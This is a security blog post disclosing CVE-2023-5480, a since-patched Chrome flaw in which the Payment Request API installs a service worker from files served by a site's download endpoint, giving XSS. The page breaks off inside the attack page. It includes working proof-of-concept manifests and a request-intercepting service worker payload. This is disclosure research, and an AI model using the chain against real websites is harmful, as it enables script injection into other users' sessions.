<!DOCTYPE html>
<html><head lang="en"><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
	<meta charset="utf-8" />
	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title>CVE-2023-5480: Chrome new XSS Vector - Slonser Notes</title><meta name="viewport" content="width=device-width, initial-scale=1">
	<meta name="description" content="Chrome XSS

The article is informative and intended for security specialists conducting testing within the scope of a contract. The author is not responsible for any damage caused by the application of the provided information. The distribution of malicious programs, disruption of system operation, and violation of the confidentiality of correspondence are pursued by law.

Preface
This article is dedicated to a vulnerability that I managed to discover in the Google Chrome browser at the end of last year, and it also recounts the story of its origin. The vulnerability persisted for an extended period and was addressed on October 31, 2023." />
	<meta property="og:image" content=""/>
	<meta property="og:url" content="//localhost:1313/posts/cve-2023-5480/">
  <meta property="og:site_name" content="Slonser Notes">
  <meta property="og:title" content="CVE-2023-5480: Chrome new XSS Vector">
  <meta property="og:description" content="Chrome XSS The article is informative and intended for security specialists conducting testing within the scope of a contract. The author is not responsible for any damage caused by the application of the provided information. The distribution of malicious programs, disruption of system operation, and violation of the confidentiality of correspondence are pursued by law.
Preface This article is dedicated to a vulnerability that I managed to discover in the Google Chrome browser at the end of last year, and it also recounts the story of its origin. The vulnerability persisted for an extended period and was addressed on October 31, 2023.">
  <meta property="og:locale" content="en_us">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2024-01-25T20:00:00+03:00">
    <meta property="article:modified_time" content="2024-01-25T20:00:00+03:00">

  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="CVE-2023-5480: Chrome new XSS Vector">
  <meta name="twitter:description" content="Chrome XSS The article is informative and intended for security specialists conducting testing within the scope of a contract. The author is not responsible for any damage caused by the application of the provided information. The distribution of malicious programs, disruption of system operation, and violation of the confidentiality of correspondence are pursued by law.
Preface This article is dedicated to a vulnerability that I managed to discover in the Google Chrome browser at the end of last year, and it also recounts the story of its origin. The vulnerability persisted for an extended period and was addressed on October 31, 2023.">

        <link href="//localhost:1313/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css" rel="stylesheet">
	

	
	<link rel="stylesheet" type="text/css" media="screen" href="//localhost:1313/css/main.6a0f23ea50fd34b46fee262a5a68e17d458c51a2bc99ba1ba018065de6b180c3.css" />
		<link id="darkModeStyle" rel="stylesheet" type="text/css" href="//localhost:1313/css/dark.50b57e12d401420df23965fed157368aba37b76df0ecefd0b1ecd4da664f01a0.css" media="(prefers-color-scheme: dark)"  />
</head>
<body>
        <div class="content"><header>
	<div class="main">
		<a href="//localhost:1313/">Slonser Notes</a>
	</div>
	<nav>
		
		<a href="/">Home</a>
		
		<a href="/posts">All posts</a>
		
		<a href="/posts/who-am-i/">About</a>
		
		<a href="/tags">Tags</a>
		
		
	</nav>
</header>

<main>
  <article>
    <div class="post-container">
      
      <div class="post-content">
        <div class="title">
          <h1 class="title">CVE-2023-5480: Chrome new XSS Vector</h1>
          <div class="meta">Posted on Jan 25, 2024</div>
        </div>
        
        <section class="body">
          <h1 id="chrome-xss">Chrome XSS</h1>
<blockquote>
<p>The article is informative and intended for security specialists conducting testing within the scope of a contract. The author is not responsible for any damage caused by the application of the provided information. The distribution of malicious programs, disruption of system operation, and violation of the confidentiality of correspondence are pursued by law.</p></blockquote>
<p><img src="./logo.png" alt=""></p>
<h1 id="preface">Preface</h1>
<p>This article is dedicated to a vulnerability that I managed to discover in the Google Chrome browser at the end of last year, and it also recounts the story of its origin. The vulnerability persisted for an extended period and was addressed on October 31, 2023.</p>
<p>Google <a href="https://chromereleases.googleblog.com/2023/10/stable-channel-update-for-desktop_31.html">evaluated</a> it at $16,000</p>
<p><img src="./1.jpg" alt=""></p>
<p>This article will begin by describing a series of modern technologies used in web development, which is necessary for a complete understanding of the context surrounding the identified vulnerability. In case your interest is solely focused on the minimal demonstration (PoC), it is recommended to proceed directly to the &ldquo;Vulnerability&rdquo; section.</p>
<h1 id="service-worker">Service Worker</h1>
<p>I&rsquo;ll start by discussing one of my favorite technologies - Service Worker. This tool serves as a kind of proxy between your browser and the network, providing the ability to have full control over all outgoing requests from your website (and to it) on the internet, as well as managing caching.</p>
<p><img src="./service-worker.jpg" alt=""></p>
<p>Typical workflow is as follows:</p>
<ol>
<li>
<p>From the page of our website, we register the service worker:</p>
<p><strong>script.js</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span>   <span style="color:#66d9ef">if</span> (<span style="color:#e6db74">&#39;serviceWorker&#39;</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">navigator</span>) {
</span></span><span style="display:flex;"><span>   <span style="color:#a6e22e">navigator</span>.<span style="color:#a6e22e">serviceWorker</span>.<span style="color:#a6e22e">register</span>(<span style="color:#e6db74">&#39;/service-worker.js&#39;</span>)
</span></span><span style="display:flex;"><span>     .<span style="color:#a6e22e">then</span>(<span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">registration</span>) {
</span></span><span style="display:flex;"><span>       <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#39;Service Worker registration successful with scope: &#39;</span>, <span style="color:#a6e22e">registration</span>.<span style="color:#a6e22e">scope</span>);
</span></span><span style="display:flex;"><span>     })
</span></span><span style="display:flex;"><span>     .<span style="color:#66d9ef">catch</span>(<span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">error</span>) {
</span></span><span style="display:flex;"><span>     <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#39;Service Worker registration failed: &#39;</span>, <span style="color:#a6e22e">error</span>);
</span></span><span style="display:flex;"><span>   });
</span></span><span style="display:flex;"><span> }
</span></span></code></pre></div></li>
<li>
<p>Simple Service Worker example:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">self</span>.<span style="color:#a6e22e">addEventListener</span>(<span style="color:#e6db74">&#39;fetch&#39;</span>, <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">event</span>) {
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">event</span>.<span style="color:#a6e22e">respondWith</span>(<span style="color:#a6e22e">function_that_returnedResponse</span>());
</span></span></code></pre></div></li>
</ol>
<p>});
Therefore, with every request to our website, whether it&rsquo;s a request for an image or a fetch request from JavaScript, it will be routed through the Service Worker. The result of the request will be returned using the pre-registered handler.</p>
<p>This is indeed a powerful tool in web development (for curiosity, you can visit <code>chrome://inspect/#service-workers</code> and see many Service Workers currently in use in your browser).</p>
<p>However, along with its effectiveness, this technology also introduces a set of challenges. Many architectural decisions in web applications (and even in browsers) are sometimes made without considering this technology, leading to the emergence of vulnerabilities.</p>
<h1 id="pwn-pwa"><del>PWN</del> PWA</h1>
<p>A Progressive Web Application (PWA) is a technology that allows emulating the installation of a website on a user&rsquo;s device. Its creation aimed to simplify the tasks of developers by providing the ability to bypass the need for developing native applications when possible.</p>
<p>PWAs are closely related to the concept of Service Worker, offering the possibility to implement functionality for so-called &ldquo;offline modes.&rdquo; This enables users to maintain the functionality of the website even when not connected to the internet.</p>
<p>To register a PWA, the Web App Manifest standard was developed. In short, it is a specific JSON file, and a basic structure is outlined below:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-JSON" data-lang="JSON"><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;short_name&#34;</span>: <span style="color:#e6db74">&#34;My App&#34;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;name&#34;</span>: <span style="color:#e6db74">&#34;My App&#34;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;icons&#34;</span>: [{
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;src&#34;</span>: <span style="color:#e6db74">&#34;https://www.myapp.example/icon.svg&#34;</span>
</span></span><span style="display:flex;"><span>  }],
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;start_url&#34;</span>: <span style="color:#e6db74">&#34;.&#34;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;display&#34;</span>: <span style="color:#e6db74">&#34;standalone&#34;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;background_color&#34;</span>: <span style="color:#e6db74">&#34;#fff&#34;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;description&#34;</span>: <span style="color:#e6db74">&#34;Slonser example&#34;</span>,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>This file contains the essential data for the application. Upon the initial visit to a PWA, the page utilizes a script similar to the one shown in the previous section to load the Service Worker.</p>
<h1 id="payments">Payments</h1>
<p>If you read <a href="https://www.w3.org/TR/payment-request/">specs</a> than you will see:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>This specification describes an API that allows user agents (e.g., browsers) to act as an intermediary between three parties in a transaction:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>The payee: the merchant that runs an online store, or other party that requests to be paid.
</span></span><span style="display:flex;"><span>The payer: the party that makes a purchase at that online store, and who authenticates and authorizes payment as required.
</span></span><span style="display:flex;"><span>The payment method: the means that the payer uses to pay the payee (e.g., a card payment or credit transfer). The payment method provider establishes the ecosystem to support that payment method.
</span></span></code></pre></div><p>From the information provided above, you might not have understood much, so let me illustrate with an example:</p>
<p><img src="./2.gif" alt=""></p>
<p>This also works in the desktop version of Chromium-based browsers:</p>
<p><img src="./3.png" alt=""></p>
<p>What happens here is:</p>
<ul>
<li>The user visits a site that presents them with a bill.</li>
<li>The site, using the Payments Request API, contacts an external resource.</li>
<li>The user sees a popup window with the external resource.</li>
<li>This resource processes the user&rsquo;s payment and returns the information about the transaction to the original resource.</li>
</ul>
<p>In code, it looks something like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">buildSupportedPaymentMethodData</span>() {
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// Example supported payment methods:
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">return</span> [{ <span style="color:#a6e22e">supportedMethods</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;https://example.com/pay&#34;</span> }];
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">buildShoppingCartDetails</span>() {
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// Hardcoded for demo purposes:
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">return</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">id</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;order-123&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">displayItems</span><span style="color:#f92672">:</span> [
</span></span><span style="display:flex;"><span>      {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">label</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;Example item&#34;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">amount</span><span style="color:#f92672">:</span> { <span style="color:#a6e22e">currency</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;USD&#34;</span>, <span style="color:#a6e22e">value</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;1.00&#34;</span> },
</span></span><span style="display:flex;"><span>      },
</span></span><span style="display:flex;"><span>    ],
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">total</span><span style="color:#f92672">:</span> {
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">label</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;Total&#34;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">amount</span><span style="color:#f92672">:</span> { <span style="color:#a6e22e">currency</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;USD&#34;</span>, <span style="color:#a6e22e">value</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;1.00&#34;</span> },
</span></span><span style="display:flex;"><span>    },
</span></span><span style="display:flex;"><span>  };
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">new</span> <span style="color:#a6e22e">PaymentRequest</span>(<span style="color:#a6e22e">buildSupportedPaymentMethodData</span>(), {
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">total</span><span style="color:#f92672">:</span> { <span style="color:#a6e22e">label</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;Stub&#34;</span>, <span style="color:#a6e22e">amount</span><span style="color:#f92672">:</span> { <span style="color:#a6e22e">currency</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;USD&#34;</span>, <span style="color:#a6e22e">value</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;0.01&#34;</span> } },
</span></span><span style="display:flex;"><span>})
</span></span><span style="display:flex;"><span>  .<span style="color:#a6e22e">canMakePayment</span>()
</span></span><span style="display:flex;"><span>  .<span style="color:#a6e22e">then</span>((<span style="color:#a6e22e">result</span>) =&gt; {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">result</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#75715e">// Real payment request
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">request</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">PaymentRequest</span>(
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">buildSupportedPaymentMethodData</span>(),
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">checkoutObject</span>,
</span></span><span style="display:flex;"><span>      );
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">request</span>.<span style="color:#a6e22e">show</span>().<span style="color:#a6e22e">then</span>((<span style="color:#a6e22e">paymentResponse</span>) =&gt; {
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Here we would process the payment.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">paymentResponse</span>.<span style="color:#a6e22e">complete</span>(<span style="color:#e6db74">&#34;success&#34;</span>).<span style="color:#a6e22e">then</span>(() =&gt; {
</span></span><span style="display:flex;"><span>          <span style="color:#75715e">// Finish handling payment
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        });
</span></span><span style="display:flex;"><span>      });
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  });
</span></span></code></pre></div><p>So, from the client side, we:</p>
<ul>
<li>Create a PaymentRequest object.</li>
<li>Pass the payment handler&rsquo;s URL and purchase details to it.</li>
<li>Call the show method and handle the Promise with the result/error.</li>
</ul>
<p>Now, what should the payment handler do?</p>
<ol>
<li>
<p>Along the provided link, it should return the <a href="https://www.rfc-editor.org/rfc/rfc5988.txt">Link</a> header.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>Link: &lt;https://bobbucks.dev/pay/payment-manifest.json&gt;; rel=&#34;payment-method-manifest&#34;
</span></span></code></pre></div><p>It&rsquo;s worth noting that according to RFC5988, rel=&ldquo;payment-method-manifest&rdquo; is not present. It will only be processed in Payments API requests, and its parsing is isolated from the main implementation.</p>
</li>
<li>
<p>The client will follow the link provided earlier and interpret its content as a Payment Manifest, for instance:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-JSON" data-lang="JSON"><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;default_applications&#34;</span>: [<span style="color:#e6db74">&#34;https://alicepay.com/pay/app/webappmanifest.json&#34;</span>],
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;supported_origins&#34;</span>: [
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;https://bobpay.xyz&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;https://alicepay.friendsofalice.example&#34;</span>
</span></span><span style="display:flex;"><span>  ]
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Here, default_applications points to the Web App Manifest that will be installed, and supported_origins indicates the supported domains accordingly.</p>
</li>
</ol>
<h1 id="jit">JIT</h1>
<p>As mentioned earlier, the Payment App should utilize the Web App Manifest, initially created for simple PWAs.</p>
<p>However, web standards developers faced the challenge of establishing communication between the website and the payment application. A controversial decision was made to leverage Service Worker for this purpose. To achieve this, new event handlers were added to the existing concept of workers:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">self</span>.<span style="color:#a6e22e">addEventListener</span>(<span style="color:#e6db74">&#39;paymentrequest&#39;</span>, <span style="color:#66d9ef">async</span> <span style="color:#a6e22e">e</span> =&gt; {
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">//...
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>});
</span></span></code></pre></div><p>However, a question arises here: during the initial invocation, the Payment App does not contain a Service Worker (as it is registered only after the first page load), which disrupts the logic.</p>
<p>This problem was addressed through another controversial decision - the introduction of Just-In-Time (JIT)-installed workers. For this, the Web App Manifest specification was extended. Now, if it is used for a Payments App, it must include the &ldquo;serviceworker&rdquo; field with the specified worker for registration:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-JSON" data-lang="JSON"><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;serviceworker&#34;</span><span style="color:#960050;background-color:#1e0010">:</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;src&#34;</span>: <span style="color:#e6db74">&#34;/download/sw-slonser.js&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;use_cache&#34;</span>: <span style="color:#66d9ef">false</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;scope&#34;</span>:<span style="color:#e6db74">&#34;/download/&#34;</span>
</span></span><span style="display:flex;"><span>  }
</span></span></code></pre></div><p>Therefore, it will download and install the Service Worker at the specified path before launching the Payment App.</p>
<h1 id="when-did-the-vulnerability-appear">When did the vulnerability appear?</h1>
<p>Payment Request was implemented in Chromium in April 2018. Initially, it was not possible to exploit the vulnerability that will be described later.</p>
<p>Reading the source code of Chromium, I came across the fact that the manifest request was actually implemented like this at that time:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C++" data-lang="C++"><span style="display:flex;"><span>  headers<span style="color:#f92672">-&gt;</span>GetNormalizedHeader(<span style="color:#e6db74">&#34;link&#34;</span>, <span style="color:#f92672">&amp;</span>link_header);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (link_header.empty()) {
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Fallback to HTTP GET when HTTP HEAD response does not contain a Link
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// header.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    FallbackToDownloadingResponseBody(final_url, std<span style="color:#f92672">::</span>move(download));
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>  }
</span></span></code></pre></div><p>So, the logic of the request followed this algorithm:</p>
<ul>
<li>First, it checks the Link header using rel=&ldquo;pay-method-manifest&rdquo;.</li>
<li>If it is present, we load this content, replacing the specified URL.</li>
<li>Otherwise, we simply use the content of the specified URL.</li>
</ul>
<p>Indeed, a brief investigation revealed that on December 18, 2019, an issue with the Payment Request implementation was submitted to Chromium:</p>
<blockquote>
<p>the spec (<a href="https://w3c.github.io/payment-method-manifest/#accessing">https://w3c.github.io/payment-method-manifest/#accessing</a>) requires that besides looking for the &ldquo;Link&rdquo;, the direct access over URL is also allowed - &ldquo;The machine-readable payment method manifest might be found either directly at the payment method identifier URL&hellip;.&rdquo;.</p></blockquote>
<p>In other words, the person pointed out that according to standards, we can transmit the payment-manifest both through a link and through the Link Header simultaneously.</p>
<p>The Chromium security team was involved in this ticket, approving the changes, and after a year, in March 2020, the fix became available in the stable branch of Chrome/Chromium.</p>
<h1 id="vulnerability">Vulnerability</h1>
<p>The vulnerability became possible due to the change described in the previous point.</p>
<p>In fact, we have a unique situation where the vulnerability arises only when strictly adhering to web standards. This is because an important aspect was not taken into account during its development.</p>
<p>Many websites implement functionality for downloading user files, i.e., we have functionality like:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-gdscript3" data-lang="gdscript3"><span style="display:flex;"><span>https:<span style="color:#f92672">//</span>example<span style="color:#f92672">.</span>com<span style="color:#f92672">/</span>download<span style="color:#960050;background-color:#1e0010">?</span>file<span style="color:#f92672">=</span>filename
</span></span><span style="display:flex;"><span>https:<span style="color:#f92672">//</span>example<span style="color:#f92672">.</span>com<span style="color:#f92672">/</span>download<span style="color:#f92672">/</span>filename
</span></span><span style="display:flex;"><span><span style="color:#f92672">...</span>
</span></span></code></pre></div><p>Such functionality should not pose direct security risks, because the Header is set:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>Content-Disposition: attachment
</span></span></code></pre></div><p>Thus, the transmitted file will be loaded directly, preventing the possibility of XSS class attacks. This is because it is impossible to deliver an HTML code file to the user for rendering.</p>
<p>Considering that the Payments API started considering the file from the request body, let&rsquo;s just upload files to the target resource:
payment-manifest:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-JSON" data-lang="JSON"><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;default_applications&#34;</span>: [<span style="color:#e6db74">&#34;https://example.com/download/manifest.js&#34;</span>],
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;supported_origins&#34;</span>: [<span style="color:#e6db74">&#34;https://attacker.net&#34;</span>]
</span></span><span style="display:flex;"><span>  }
</span></span></code></pre></div><p>manifest.js:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-JSON" data-lang="JSON"><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;name&#34;</span>: <span style="color:#e6db74">&#34;PWNED&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;short_name&#34;</span>: <span style="color:#e6db74">&#34;PWNED&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;icons&#34;</span>: [{
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;src&#34;</span>: <span style="color:#e6db74">&#34;/download/logo.jpg&#34;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;sizes&#34;</span>: <span style="color:#e6db74">&#34;49x49&#34;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;type&#34;</span>: <span style="color:#e6db74">&#34;image/jpeg&#34;</span>
</span></span><span style="display:flex;"><span>    }],
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;serviceworker&#34;</span>: {
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;src&#34;</span>: <span style="color:#e6db74">&#34;/download/sw-slonser.js&#34;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;use_cache&#34;</span>: <span style="color:#66d9ef">false</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;scope&#34;</span>:<span style="color:#e6db74">&#34;/download/&#34;</span>
</span></span><span style="display:flex;"><span>    },
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;start_url&#34;</span>:<span style="color:#e6db74">&#34;/download/index.html&#34;</span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>logo.jpg:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>* JPEG *
</span></span></code></pre></div><p>At first glance, it may seem not too useful, as why would we process responses coming from Payments. But here, it&rsquo;s worth recalling how the communication between our site and the Payment App is implemented - through Service Workers.</p>
<p>We can specify a Service Worker in Payments, as I mentioned earlier, it&rsquo;s just a regular Service Worker, with additional events provided for it. Therefore, nothing prevents us from using the standard capabilities of the Service Worker.</p>
<p>sw.slonser.js</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">self</span>.<span style="color:#a6e22e">addEventListener</span>(<span style="color:#e6db74">&#34;fetch&#34;</span>, (<span style="color:#a6e22e">event</span>) =&gt; {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">`Handling fetch event for </span><span style="color:#e6db74">${</span><span style="color:#a6e22e">event</span>.<span style="color:#a6e22e">request</span>.<span style="color:#a6e22e">url</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">blob</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Blob</span>([<span style="color:#e6db74">&#34;&lt;script&gt;alert(&#39;pwned by Slonser&#39;)&lt;/script&gt;&#34;</span>],{<span style="color:#a6e22e">type</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;text/html&#34;</span>});
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">event</span>.<span style="color:#a6e22e">respondWith</span>(<span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Response</span>(<span style="color:#a6e22e">blob</span>));
</span></span><span style="display:flex;"><span>  });
</span></span></code></pre></div><p>This script intercepts all network requests and responds with HTML:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span>&gt;<span style="color:#a6e22e">alert</span>(<span style="color:#e6db74">&#39;pwned by Slonser&#39;</span>)&lt;/<span style="color:#f92672">script</span>&gt;
</span></span></code></pre></div><p>After this, the attacker just needs to redirect the victim to their domain, where the following code is hosted:</p>
<p>attack.html</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE html&gt;</span>
</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span> <span style="color:#a6e22e">lang</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;en&#34;</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">head</span>&gt;
</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">meta</span> <span style="color:#a6e22e">charset</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;UTF-8&#34;</span>&gt;
</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">meta</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;viewport&#34;</span> <span style="color:#a6e22e">content</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;width=device-width, initial-scale=1.0&#34;</span>&gt;
</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">title</span>&gt;Vsevolod Kokorin (Slonser) of Solidlab&lt;/<span style="color:#f92672">title</span>&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">head</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">body</span>&gt;
</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">button</span> <span style="color:#a6e22e">onclick</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;exploit()&#34;</span>&gt;EXPLOIT&lt;/<span style="color:#f92672">button</span>&gt;
</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">script</span>&gt;
